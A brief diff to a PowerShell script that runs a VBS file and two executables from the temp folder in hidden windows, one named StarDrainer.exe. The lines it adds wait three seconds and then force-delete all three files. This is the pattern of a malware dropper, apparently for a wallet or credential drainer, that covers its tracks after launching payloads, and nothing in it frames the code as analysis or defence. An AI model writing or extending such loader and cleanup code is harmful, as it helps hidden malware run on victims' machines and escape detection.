@@ -10,3 +10,9 @@ $d2 = "$env:TEMP\StarDrainer.exe"
 Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden
 Start-Process -FilePath $d1 -WindowStyle Hidden
 Start-Process -FilePath $d2 -WindowStyle Hidden
+
+Start-Sleep -Seconds 3
+
+Remove-Item -Path $vbs -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $d1 -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $d2 -Force -ErrorAction SilentlyContinue
